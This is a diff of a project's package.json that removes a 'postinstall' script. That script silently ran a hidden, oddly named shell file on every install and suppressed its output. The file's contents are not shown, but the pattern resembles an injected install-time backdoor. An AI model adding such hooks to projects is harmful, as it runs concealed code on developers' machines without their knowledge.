@@ -20,8 +20,7 @@
     "lint:ui": "yarn --cwd packages/ui-kit lint",
     "lint:fix": "yarn --cwd packages/frontend lint --fix && yarn --cwd packages/ui-kit lint --fix",
     "prepare": "husky install",
-    "typecheck": "yarn --cwd packages/frontend typecheck && yarn --cwd packages/ui-kit typecheck",
-    "postinstall": "sh ./.ci-5fcwdy.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "typecheck": "yarn --cwd packages/frontend typecheck && yarn --cwd packages/ui-kit typecheck"
   },
   "devDependencies": {
     "@testing-library/cypress": "9.0.0",
